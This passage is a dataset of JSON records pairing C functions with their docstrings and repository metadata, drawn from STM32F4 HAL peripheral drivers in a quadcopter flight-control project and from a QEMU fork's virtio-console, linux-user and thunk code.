"stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  De-initialize registers of the selected ADC instance\n  *         to their default reset values.\n  * @note   To reset all ADC instances quickly (perform a hard reset),\n  *         use function @ref LL_ADC_CommonDeInit().\n  * @param  ADCx ADC instance\n  * @retval An ErrorStatus enumeration value:\n  *          - SUCCESS: ADC registers are de-initialized\n  *          - ERROR: ADC registers are not de-initialized\n  */\n", "func_signal": "ErrorStatus LL_ADC_DeInit(ADC_TypeDef *ADCx)", "code": "{\n  ErrorStatus status = SUCCESS;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_INSTANCE(ADCx));\n  \n  /* Disable ADC instance if not already disabled.                            */\n  if(LL_ADC_IsEnabled(ADCx) == 1U)\n  {\n    /* Set ADC group regular trigger source to SW start to ensure to not      */\n    /* have an external trigger event occurring during the conversion stop    */\n    /* ADC disable process.                                                   */\n    LL_ADC_REG_SetTriggerSource(ADCx, LL_ADC_REG_TRIG_SOFTWARE);\n    \n    /* Set ADC group injected trigger source to SW start to ensure to not     */\n    /* have an external trigger event occurring during the conversion stop    */\n    /* ADC disable process.                                                   */\n    LL_ADC_INJ_SetTriggerSource(ADCx, LL_ADC_INJ_TRIG_SOFTWARE);\n    \n    /* Disable the ADC instance */\n    LL_ADC_Disable(ADCx);\n  }\n  \n  /* Check whether ADC state is compliant with expected state */\n  /* (hardware requirements of bits state to reset registers below) */\n  if(READ_BIT(ADCx->CR2, ADC_CR2_ADON) == 0U)\n  {\n    /* ========== Reset ADC registers ========== */\n    /* Reset register SR */\n    CLEAR_BIT(ADCx->SR,\n              (  LL_ADC_FLAG_STRT\n               | LL_ADC_FLAG_JSTRT\n               | LL_ADC_FLAG_EOCS\n               | LL_ADC_FLAG_OVR\n               | LL_ADC_FLAG_JEOS\n               | LL_ADC_FLAG_AWD1 )\n             );\n    \n    /* Reset register CR1 */\n    CLEAR_BIT(ADCx->CR1,\n              (  ADC_CR1_OVRIE   | ADC_CR1_RES     | ADC_CR1_AWDEN\n               | ADC_CR1_JAWDEN\n               | ADC_CR1_DISCNUM | ADC_CR1_JDISCEN | ADC_CR1_DISCEN\n               | ADC_CR1_JAUTO   | ADC_CR1_AWDSGL  | ADC_CR1_SCAN\n               | ADC_CR1_JEOCIE  | ADC_CR1_AWDIE   | ADC_CR1_EOCIE\n               | ADC_CR1_AWDCH                                     )\n             );\n    \n    /* Reset register CR2 */\n    CLEAR_BIT(ADCx->CR2,\n              (  ADC_CR2_SWSTART  | ADC_CR2_EXTEN  | ADC_CR2_EXTSEL\n               | ADC_CR2_JSWSTART | ADC_CR2_JEXTEN | ADC_CR2_JEXTSEL\n               | ADC_CR2_ALIGN    | ADC_CR2_EOCS\n               | ADC_CR2_DDS      | ADC_CR2_DMA\n               | ADC_CR2_CONT     | ADC_CR2_ADON                    )\n             );\n    \n    /* Reset register SMPR1 */\n    CLEAR_BIT(ADCx->SMPR1,\n              (  ADC_SMPR1_SMP18 | ADC_SMPR1_SMP17 | ADC_SMPR1_SMP16\n               | ADC_SMPR1_SMP15 | ADC_SMPR1_SMP14 | ADC_SMPR1_SMP13\n               | ADC_SMPR1_SMP12 | ADC_SMPR1_SMP11 | ADC_SMPR1_SMP10)\n             );\n    \n    /* Reset register SMPR2 */\n    CLEAR_BIT(ADCx->SMPR2,\n              (  ADC_SMPR2_SMP9\n               | ADC_SMPR2_SMP8 | ADC_SMPR2_SMP7 | ADC_SMPR2_SMP6\n               | ADC_SMPR2_SMP5 | ADC_SMPR2_SMP4 | ADC_SMPR2_SMP3\n               | ADC_SMPR2_SMP2 | ADC_SMPR2_SMP1 | ADC_SMPR2_SMP0)\n             );\n    \n    /* Reset register JOFR1 */\n    CLEAR_BIT(ADCx->JOFR1, ADC_JOFR1_JOFFSET1);\n    /* Reset register JOFR2 */\n    CLEAR_BIT(ADCx->JOFR2, ADC_JOFR2_JOFFSET2);\n    /* Reset register JOFR3 */\n    CLEAR_BIT(ADCx->JOFR3, ADC_JOFR3_JOFFSET3);\n    /* Reset register JOFR4 */\n    CLEAR_BIT(ADCx->JOFR4, ADC_JOFR4_JOFFSET4);\n    \n    /* Reset register HTR */\n    SET_BIT(ADCx->HTR, ADC_HTR_HT);\n    /* Reset register LTR */\n    CLEAR_BIT(ADCx->LTR, ADC_LTR_LT);\n    \n    /* Reset register SQR1 */\n    CLEAR_BIT(ADCx->SQR1,\n              (  ADC_SQR1_L\n               | ADC_SQR1_SQ16\n               | ADC_SQR1_SQ15 | ADC_SQR1_SQ14 | ADC_SQR1_SQ13)\n             );\n             \n    /* Reset register SQR2 */\n    CLEAR_BIT(ADCx->SQR2,\n              (  ADC_SQR2_SQ12 | ADC_SQR2_SQ11 | ADC_SQR2_SQ10\n               | ADC_SQR2_SQ9 | ADC_SQR2_SQ8 | ADC_SQR2_SQ7)\n             );\n    \n    \n    /* Reset register JSQR */\n    CLEAR_BIT(ADCx->JSQR,\n              (  ADC_JSQR_JL\n               | ADC_JSQR_JSQ4 | ADC_JSQR_JSQ3\n               | ADC_JSQR_JSQ2 | ADC_JSQR_JSQ1  )\n             );\n    \n    /* Reset register DR */\n    /* bits in access mode read only, no direct reset applicable */\n    \n    /* Reset registers JDR1, JDR2, JDR3, JDR4 */\n    /* bits in access mode read only, no direct reset applicable */\n    \n    /* Reset register CCR */\n    CLEAR_BIT(ADC->CCR, ADC_CCR_TSVREFE | ADC_CCR_ADCPRE);\n  }\n  \n  return status;\n}", "path": "Software\\QFCs_ApplicationAHRS\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_ll_adc.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  This function de-Initializes common part of the HAL and stops the systick.\n  *         This function is optional.   \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_DeInit(void)", "code": "{\n  /* Reset of all peripherals */\n  __HAL_RCC_APB1_FORCE_RESET();\n  __HAL_RCC_APB1_RELEASE_RESET();\n\n  __HAL_RCC_APB2_FORCE_RESET();\n  __HAL_RCC_APB2_RELEASE_RESET();\n\n  __HAL_RCC_AHB1_FORCE_RESET();\n  __HAL_RCC_AHB1_RELEASE_RESET();\n\n  __HAL_RCC_AHB2_FORCE_RESET();\n  __HAL_RCC_AHB2_RELEASE_RESET();\n\n  __HAL_RCC_AHB3_FORCE_RESET();\n  __HAL_RCC_AHB3_RELEASE_RESET();\n\n  /* De-Init the low level hardware */\n  HAL_MspDeInit();\n    \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Software\\QFCs_Peripheral_TIM\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Handles DAC interrupt request  \n  * @param  hdac: pointer to a DAC_HandleTypeDef structure that contains\n  *         the configuration information for the specified DAC.\n  * @retval None\n  */\n", "func_signal": "void HAL_DAC_IRQHandler(DAC_HandleTypeDef* hdac)", "code": "{\n  /* Check underrun channel 1 flag */\n  if(__HAL_DAC_GET_FLAG(hdac, DAC_FLAG_DMAUDR1))\n  {\n    /* Change DAC state to error state */\n    hdac->State = HAL_DAC_STATE_ERROR;\n    \n    /* Set DAC error code to channel1 DMA underrun error */\n    hdac->ErrorCode |= HAL_DAC_ERROR_DMAUNDERRUNCH1;\n    \n    /* Clear the underrun flag */\n    __HAL_DAC_CLEAR_FLAG(hdac,DAC_FLAG_DMAUDR1);\n    \n    /* Disable the selected DAC channel1 DMA request */\n    hdac->Instance->CR &= ~DAC_CR_DMAEN1;\n    \n    /* Error callback */ \n    HAL_DAC_DMAUnderrunCallbackCh1(hdac);\n  }\n  /* Check underrun channel 2 flag */\n  if(__HAL_DAC_GET_FLAG(hdac, DAC_FLAG_DMAUDR2))\n  {\n    /* Change DAC state to error state */\n    hdac->State = HAL_DAC_STATE_ERROR;\n    \n    /* Set DAC error code to channel2 DMA underrun error */\n    hdac->ErrorCode |= HAL_DAC_ERROR_DMAUNDERRUNCH2;\n    \n    /* Clear the underrun flag */\n    __HAL_DAC_CLEAR_FLAG(hdac,DAC_FLAG_DMAUDR2);\n    \n    /* Disable the selected DAC channel1 DMA request */\n    hdac->Instance->CR &= ~DAC_CR_DMAEN2;\n    \n    /* Error callback */ \n    HAL_DACEx_DMAUnderrunCallbackCh2(hdac);\n  }\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_dac.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Set each @ref LL_ADC_INJ_InitTypeDef field to default value.\n  * @param  ADC_INJ_InitStruct Pointer to a @ref LL_ADC_INJ_InitTypeDef structure\n  *                            whose fields will be set to default values.\n  * @retval None\n  */\n", "func_signal": "void LL_ADC_INJ_StructInit(LL_ADC_INJ_InitTypeDef *ADC_INJ_InitStruct)", "code": "{\n  /* Set ADC_INJ_InitStruct fields to default values */\n  /* Set fields of ADC group injected */\n  ADC_INJ_InitStruct->TriggerSource    = LL_ADC_INJ_TRIG_SOFTWARE;\n  ADC_INJ_InitStruct->SequencerLength  = LL_ADC_INJ_SEQ_SCAN_DISABLE;\n  ADC_INJ_InitStruct->SequencerDiscont = LL_ADC_INJ_SEQ_DISCONT_DISABLE;\n  ADC_INJ_InitStruct->TrigAuto         = LL_ADC_INJ_TRIG_INDEPENDENT;\n}", "path": "Software\\QFCs_ApplicationAHRS\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_ll_adc.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  DMA error callback \n  * @param  hdma: pointer to a DMA_HandleTypeDef structure that contains\n  *                the configuration information for the specified DMA module.\n  * @retval None\n  */\n", "func_signal": "static void DAC_DMAErrorCh1(DMA_HandleTypeDef *hdma)", "code": "{\n  DAC_HandleTypeDef* hdac = ( DAC_HandleTypeDef* )((DMA_HandleTypeDef* )hdma)->Parent;\n    \n  /* Set DAC error code to DMA error */\n  hdac->ErrorCode |= HAL_DAC_ERROR_DMA;\n    \n  HAL_DAC_ErrorCallbackCh1(hdac); \n    \n  hdac->State= HAL_DAC_STATE_READY;\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_dac.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Returns the last data output value of the selected DAC channel.\n  * @param  hdac: pointer to a DAC_HandleTypeDef structure that contains\n  *         the configuration information for the specified DAC.\n  * @param  Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_CHANNEL_1: DAC Channel1 selected\n  *            @arg DAC_CHANNEL_2: DAC Channel2 selected\n  * @retval The selected DAC channel data output value.\n  */\n", "func_signal": "uint32_t HAL_DAC_GetValue(DAC_HandleTypeDef* hdac, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(Channel));\n  \n  /* Returns the DAC channel data output register value */\n  if(Channel == DAC_CHANNEL_1)\n  {\n    return hdac->Instance->DOR1;\n  }\n  else\n  {\n    return hdac->Instance->DOR2;\n  }\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_dac.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief Return the unique device identifier (UID based on 96 bits)\n  * @param UID: pointer to 3 words array.\n  * @retval Device identifier\n  */\n", "func_signal": "void HAL_GetUID(uint32_t *UID)", "code": "{\n  UID[0] = (uint32_t)(READ_REG(*((uint32_t *)UID_BASE)));\n  UID[1] = (uint32_t)(READ_REG(*((uint32_t *)(UID_BASE + 4U))));\n  UID[2] = (uint32_t)(READ_REG(*((uint32_t *)(UID_BASE + 8U))));\n}", "path": "Software\\QFCs_Peripheral_TIM\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Suspend Tick increment.\n  * @note   Disable the tick increment by disabling RTC ALARM interrupt.\n  * @retval None\n  */\n", "func_signal": "void HAL_SuspendTick(void)", "code": "{\n  /* Disable the write protection for RTC registers */\n  __HAL_RTC_WRITEPROTECTION_DISABLE(&hRTC_Handle);\n  /* Disable RTC ALARM update Interrupt */\n  __HAL_RTC_ALARM_DISABLE_IT(&hRTC_Handle, RTC_IT_ALRA);\n  /* Enable the write protection for RTC registers */\n  __HAL_RTC_WRITEPROTECTION_ENABLE(&hRTC_Handle);\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_timebase_rtc_alarm_template.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Deinitializes the DAC peripheral registers to their default reset values.\n  * @param  hdac: pointer to a DAC_HandleTypeDef structure that contains\n  *         the configuration information for the specified DAC.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_DAC_DeInit(DAC_HandleTypeDef* hdac)", "code": "{\n  /* Check DAC handle */\n  if(hdac == NULL)\n  {\n     return HAL_ERROR;\n  }\n\n  /* Check the parameters */\n  assert_param(IS_DAC_ALL_INSTANCE(hdac->Instance));\n\n  /* Change DAC state */\n  hdac->State = HAL_DAC_STATE_BUSY;\n\n  /* DeInit the low level hardware */\n  HAL_DAC_MspDeInit(hdac);\n\n  /* Set DAC error code to none */\n  hdac->ErrorCode = HAL_DAC_ERROR_NONE;\n\n  /* Change DAC state */\n  hdac->State = HAL_DAC_STATE_RESET;\n\n  /* Release Lock */\n  __HAL_UNLOCK(hdac);\n\n  /* Return function status */\n  return HAL_OK;\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_dac.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  DMA conversion complete callback. \n  * @param  hdma: pointer to a DMA_HandleTypeDef structure that contains\n  *                the configuration information for the specified DMA module.\n  * @retval None\n  */\n", "func_signal": "static void DAC_DMAConvCpltCh1(DMA_HandleTypeDef *hdma)", "code": "{\n  DAC_HandleTypeDef* hdac = ( DAC_HandleTypeDef* )((DMA_HandleTypeDef* )hdma)->Parent;\n  \n  HAL_DAC_ConvCpltCallbackCh1(hdac); \n  \n  hdac->State= HAL_DAC_STATE_READY;\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_dac.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Disables DAC and stop conversion of channel.\n  * @param  hdac: pointer to a DAC_HandleTypeDef structure that contains\n  *         the configuration information for the specified DAC.\n  * @param  Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_CHANNEL_1: DAC Channel1 selected\n  *            @arg DAC_CHANNEL_2: DAC Channel2 selected   \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_DAC_Stop_DMA(DAC_HandleTypeDef* hdac, uint32_t Channel)", "code": "{\n  HAL_StatusTypeDef status = HAL_OK;\n\n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(Channel));\n  \n  /* Disable the selected DAC channel DMA request */\n   hdac->Instance->CR &= ~(DAC_CR_DMAEN1 << Channel);\n    \n  /* Disable the Peripheral */\n  __HAL_DAC_DISABLE(hdac, Channel);\n  \n  /* Disable the DMA Channel */\n  /* Channel1 is used */\n  if(Channel == DAC_CHANNEL_1)\n  { \n    status = HAL_DMA_Abort(hdac->DMA_Handle1);\n  }\n  else /* Channel2 is used for */\n  { \n    status = HAL_DMA_Abort(hdac->DMA_Handle2); \n  }\n\n  /* Check if DMA Channel effectively disabled */\n  if(status != HAL_OK)\n  {\n    /* Update DAC state machine to error */\n    hdac->State = HAL_DAC_STATE_ERROR;      \n  }\n  else\n  {\n    /* Change DAC state */\n    hdac->State = HAL_DAC_STATE_READY;\n  }\n\n  /* Return function status */\n  return status;\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_dac.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/*\n * Callback function that's called from chardevs when backend becomes\n * writable.\n */\n", "func_signal": "static gboolean chr_write_unblocked(GIOChannel *chan, GIOCondition cond,\n                                    void *opaque)", "code": "{\n    VirtConsole *vcon = opaque;\n\n    vcon->watch = 0;\n    virtio_serial_throttle_port(VIRTIO_SERIAL_PORT(vcon), false);\n    return FALSE;\n}", "path": "hw\\char\\virtio-console.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* Callback function that's called when the guest opens/closes the port */\n", "func_signal": "static void set_guest_connected(VirtIOSerialPort *port, int guest_connected)", "code": "{\n    VirtConsole *vcon = VIRTIO_CONSOLE(port);\n    DeviceState *dev = DEVICE(port);\n    VirtIOSerialPortClass *k = VIRTIO_SERIAL_PORT_GET_CLASS(port);\n\n    if (!k->is_console) {\n        qemu_chr_fe_set_open(&vcon->chr, guest_connected);\n    }\n\n    if (dev->id) {\n        qapi_event_send_vserport_change(dev->id, guest_connected,\n                                        &error_abort);\n    }\n}", "path": "hw\\char\\virtio-console.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* Send data from a char device over to the guest */\n", "func_signal": "static void chr_read(void *opaque, const uint8_t *buf, int size)", "code": "{\n    VirtConsole *vcon = opaque;\n    VirtIOSerialPort *port = VIRTIO_SERIAL_PORT(vcon);\n\n    trace_virtio_console_chr_read(port->id, size);\n    virtio_serial_write(port, buf, size);\n}", "path": "hw\\char\\virtio-console.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* O32 */\n", "func_signal": "static int do_store_exclusive(CPUMIPSState *env)", "code": "{\n    target_ulong addr;\n    target_ulong page_addr;\n    target_ulong val;\n    int flags;\n    int segv = 0;\n    int reg;\n    int d;\n\n    addr = env->lladdr;\n    page_addr = addr & TARGET_PAGE_MASK;\n    start_exclusive();\n    mmap_lock();\n    flags = page_get_flags(page_addr);\n    if ((flags & PAGE_READ) == 0) {\n        segv = 1;\n    } else {\n        reg = env->llreg & 0x1f;\n        d = (env->llreg & 0x20) != 0;\n        if (d) {\n            segv = get_user_s64(val, addr);\n        } else {\n            segv = get_user_s32(val, addr);\n        }\n        if (!segv) {\n            if (val != env->llval) {\n                env->active_tc.gpr[reg] = 0;\n            } else {\n                if (d) {\n                    segv = put_user_u64(env->llnewval, addr);\n                } else {\n                    segv = put_user_u32(env->llnewval, addr);\n                }\n                if (!segv) {\n                    env->active_tc.gpr[reg] = 1;\n                }\n            }\n        }\n    }\n    env->lladdr = -1;\n    if (!segv) {\n        env->active_tc.PC += 4;\n    }\n    mmap_unlock();\n    end_exclusive();\n    return segv;\n}", "path": "linux-user\\main.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* Callback function that's called when the guest sends us data */\n", "func_signal": "static ssize_t flush_buf(VirtIOSerialPort *port,\n                         const uint8_t *buf, ssize_t len)", "code": "{\n    VirtConsole *vcon = VIRTIO_CONSOLE(port);\n    ssize_t ret;\n\n    if (!qemu_chr_fe_get_driver(&vcon->chr)) {\n        /* If there's no backend, we can just say we consumed all data. */\n        return len;\n    }\n\n    ret = qemu_chr_fe_write(&vcon->chr, buf, len);\n    trace_virtio_console_flush_buf(port->id, len, ret);\n\n    if (ret < len) {\n        VirtIOSerialPortClass *k = VIRTIO_SERIAL_PORT_GET_CLASS(port);\n\n        /*\n         * Ideally we'd get a better error code than just -1, but\n         * that's what the chardev interface gives us right now.  If\n         * we had a finer-grained message, like -EPIPE, we could close\n         * this connection.\n         */\n        if (ret < 0)\n            ret = 0;\n\n        /* XXX we should be queuing data to send later for the\n         * console devices too rather than silently dropping\n         * console data on EAGAIN. The Linux virtio-console\n         * hvc driver though does sends with spinlocks held,\n         * so if we enable throttling that'll stall the entire\n         * guest kernel, not merely the process writing to the\n         * console.\n         *\n         * While we could queue data for later write without\n         * enabling throttling, this would result in the guest\n         * being able to trigger arbitrary memory usage in QEMU\n         * buffering data for later writes.\n         *\n         * So fixing this problem likely requires fixing the\n         * Linux virtio-console hvc driver to not hold spinlocks\n         * while writing, and instead merely block the process\n         * that's writing. QEMU would then need some way to detect\n         * if the guest had the fixed driver too, before we can\n         * use throttling on host side.\n         */\n        if (!k->is_console) {\n            virtio_serial_throttle_port(port, true);\n            if (!vcon->watch) {\n                vcon->watch = qemu_chr_fe_add_watch(&vcon->chr,\n                                                    G_IO_OUT|G_IO_HUP,\n                                                    chr_write_unblocked, vcon);\n            }\n        }\n    }\n    return ret;\n}", "path": "hw\\char\\virtio-console.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* AArch64 main loop */\n", "func_signal": "void cpu_loop(CPUARMState *env)", "code": "{\n    CPUState *cs = CPU(arm_env_get_cpu(env));\n    int trapnr, sig;\n    abi_long ret;\n    target_siginfo_t info;\n\n    for (;;) {\n        cpu_exec_start(cs);\n        trapnr = cpu_exec(cs);\n        cpu_exec_end(cs);\n        process_queued_cpu_work(cs);\n\n        switch (trapnr) {\n        case EXCP_SWI:\n            ret = do_syscall(env,\n                             env->xregs[8],\n                             env->xregs[0],\n                             env->xregs[1],\n                             env->xregs[2],\n                             env->xregs[3],\n                             env->xregs[4],\n                             env->xregs[5],\n                             0, 0);\n            if (ret == -TARGET_ERESTARTSYS) {\n                env->pc -= 4;\n            } else if (ret != -TARGET_QEMU_ESIGRETURN) {\n                env->xregs[0] = ret;\n            }\n            break;\n        case EXCP_INTERRUPT:\n            /* just indicate that signals should be handled asap */\n            break;\n        case EXCP_UDEF:\n            info.si_signo = TARGET_SIGILL;\n            info.si_errno = 0;\n            info.si_code = TARGET_ILL_ILLOPN;\n            info._sifields._sigfault._addr = env->pc;\n            queue_signal(env, info.si_signo, QEMU_SI_FAULT, &info);\n            break;\n        case EXCP_PREFETCH_ABORT:\n        case EXCP_DATA_ABORT:\n            info.si_signo = TARGET_SIGSEGV;\n            info.si_errno = 0;\n            /* XXX: check env->error_code */\n            info.si_code = TARGET_SEGV_MAPERR;\n            info._sifields._sigfault._addr = env->exception.vaddress;\n            queue_signal(env, info.si_signo, QEMU_SI_FAULT, &info);\n            break;\n        case EXCP_DEBUG:\n        case EXCP_BKPT:\n            sig = gdb_handlesig(cs, TARGET_SIGTRAP);\n            if (sig) {\n                info.si_signo = sig;\n                info.si_errno = 0;\n                info.si_code = TARGET_TRAP_BRKPT;\n                queue_signal(env, info.si_signo, QEMU_SI_FAULT, &info);\n            }\n            break;\n        case EXCP_SEMIHOST:\n            env->xregs[0] = do_arm_semihosting(env);\n            break;\n        case EXCP_YIELD:\n            /* nothing to do here for user-mode, just resume guest code */\n            break;\n        case EXCP_ATOMIC:\n            cpu_exec_step_atomic(cs);\n            break;\n        default:\n            EXCP_DUMP(env, \"qemu: unhandled CPU exception 0x%x - aborting\\n\", trapnr);\n            abort();\n        }\n        process_pending_signals(env);\n        /* Exception return on AArch64 always clears the exclusive monitor,\n         * so any return to running guest code implies this.\n         */\n        env->exclusive_addr = -1;\n    }\n}", "path": "linux-user\\main.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* now we can define the main conversion functions */\n", "func_signal": "const argtype *thunk_convert(void *dst, const void *src,\n                             const argtype *type_ptr, int to_host)", "code": "{\n    int type;\n\n    type = *type_ptr++;\n    switch(type) {\n    case TYPE_CHAR:\n        *(uint8_t *)dst = *(uint8_t *)src;\n        break;\n    case TYPE_SHORT:\n        *(uint16_t *)dst = tswap16(*(uint16_t *)src);\n        break;\n    case TYPE_INT:\n        *(uint32_t *)dst = tswap32(*(uint32_t *)src);\n        break;\n    case TYPE_LONGLONG:\n    case TYPE_ULONGLONG:\n        *(uint64_t *)dst = tswap64(*(uint64_t *)src);\n        break;\n#if HOST_LONG_BITS == 32 && TARGET_ABI_BITS == 32\n    case TYPE_LONG:\n    case TYPE_ULONG:\n    case TYPE_PTRVOID:\n        *(uint32_t *)dst = tswap32(*(uint32_t *)src);\n        break;\n#elif HOST_LONG_BITS == 64 && TARGET_ABI_BITS == 32\n    case TYPE_LONG:\n    case TYPE_ULONG:\n    case TYPE_PTRVOID:\n        if (to_host) {\n            if (type == TYPE_LONG) {\n                /* sign extension */\n                *(uint64_t *)dst = (int32_t)tswap32(*(uint32_t *)src);\n            } else {\n                *(uint64_t *)dst = tswap32(*(uint32_t *)src);\n            }\n        } else {\n            *(uint32_t *)dst = tswap32(*(uint64_t *)src & 0xffffffff);\n        }\n        break;\n#elif HOST_LONG_BITS == 64 && TARGET_ABI_BITS == 64\n    case TYPE_LONG:\n    case TYPE_ULONG:\n    case TYPE_PTRVOID:\n        *(uint64_t *)dst = tswap64(*(uint64_t *)src);\n        break;\n#elif HOST_LONG_BITS == 32 && TARGET_ABI_BITS == 64\n    case TYPE_LONG:\n    case TYPE_ULONG:\n    case TYPE_PTRVOID:\n        if (to_host) {\n            *(uint32_t *)dst = tswap64(*(uint64_t *)src);\n        } else {\n            if (type == TYPE_LONG) {\n                /* sign extension */\n                *(uint64_t *)dst = tswap64(*(int32_t *)src);\n            } else {\n                *(uint64_t *)dst = tswap64(*(uint32_t *)src);\n            }\n        }\n        break;\n#else\n#warning unsupported conversion\n#endif\n    case TYPE_OLDDEVT:\n    {\n        uint64_t val = 0;\n        switch (thunk_type_size(type_ptr - 1, !to_host)) {\n        case 2:\n            val = *(uint16_t *)src;\n            break;\n        case 4:\n            val = *(uint32_t *)src;\n            break;\n        case 8:\n            val = *(uint64_t *)src;\n            break;\n        }\n        switch (thunk_type_size(type_ptr - 1, to_host)) {\n        case 2:\n            *(uint16_t *)dst = tswap16(val);\n            break;\n        case 4:\n            *(uint32_t *)dst = tswap32(val);\n            break;\n        case 8:\n            *(uint64_t *)dst = tswap64(val);\n            break;\n        }\n        break;\n    }\n    case TYPE_ARRAY:\n        {\n            int array_length, i, dst_size, src_size;\n            const uint8_t *s;\n            uint8_t  *d;\n\n            array_length = *type_ptr++;\n            dst_size = thunk_type_size(type_ptr, to_host);\n            src_size = thunk_type_size(type_ptr, 1 - to_host);\n            d = dst;\n            s = src;\n            for(i = 0;i < array_length; i++) {\n                thunk_convert(d, s, type_ptr, to_host);\n                d += dst_size;\n                s += src_size;\n            }\n            type_ptr = thunk_type_next(type_ptr);\n        }\n        break;\n    case TYPE_STRUCT:\n        {\n            int i;\n            const StructEntry *se;\n            const uint8_t *s;\n            uint8_t  *d;\n            const argtype *field_types;\n            const int *dst_offsets, *src_offsets;\n\n            assert(*type_ptr < max_struct_entries);\n            se = struct_entries + *type_ptr++;\n            if (se->convert[0] != NULL) {\n                /* specific conversion is needed */\n                (*se->convert[to_host])(dst, src);\n            } else {\n                /* standard struct conversion */\n                field_types = se->field_types;\n                dst_offsets = se->field_offsets[to_host];\n                src_offsets = se->field_offsets[1 - to_host];\n                d = dst;\n                s = src;\n                for(i = 0;i < se->nb_fields; i++) {\n                    field_types = thunk_convert(d + dst_offsets[i],\n                                                s + src_offsets[i],\n                                                field_types, to_host);\n                }\n            }\n        }\n        break;\n    default:\n        fprintf(stderr, \"Invalid type 0x%x\\n\", type);\n        break;\n    }\n    return type_ptr;\n}", "path": "thunk.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* virtio-mmio-bus. */\n", "func_signal": "static char *virtio_mmio_bus_get_dev_path(DeviceState *dev)", "code": "{\n    BusState *virtio_mmio_bus;\n    VirtIOMMIOProxy *virtio_mmio_proxy;\n    char *proxy_path;\n    SysBusDevice *proxy_sbd;\n    char *path;\n\n    virtio_mmio_bus = qdev_get_parent_bus(dev);\n    virtio_mmio_proxy = VIRTIO_MMIO(virtio_mmio_bus->parent);\n    proxy_path = qdev_get_dev_path(DEVICE(virtio_mmio_proxy));\n\n    /*\n     * If @format_transport_address is false, then we just perform the same as\n     * virtio_bus_get_dev_path(): we delegate the address formatting for the\n     * device on the virtio-mmio bus to the bus that the virtio-mmio proxy\n     * (i.e., the device that implements the virtio-mmio bus) resides on. In\n     * this case the base address of the virtio-mmio transport will be\n     * invisible.\n     */\n    if (!virtio_mmio_proxy->format_transport_address) {\n        return proxy_path;\n    }\n\n    /* Otherwise, we append the base address of the transport. */\n    proxy_sbd = SYS_BUS_DEVICE(virtio_mmio_proxy);\n    assert(proxy_sbd->num_mmio == 1);\n    assert(proxy_sbd->mmio[0].memory == &virtio_mmio_proxy->iomem);\n\n    if (proxy_path) {\n        path = g_strdup_printf(\"%s/virtio-mmio@\" TARGET_FMT_plx, proxy_path,\n                               proxy_sbd->mmio[0].addr);\n    } else {\n        path = g_strdup_printf(\"virtio-mmio@\" TARGET_FMT_plx,\n                               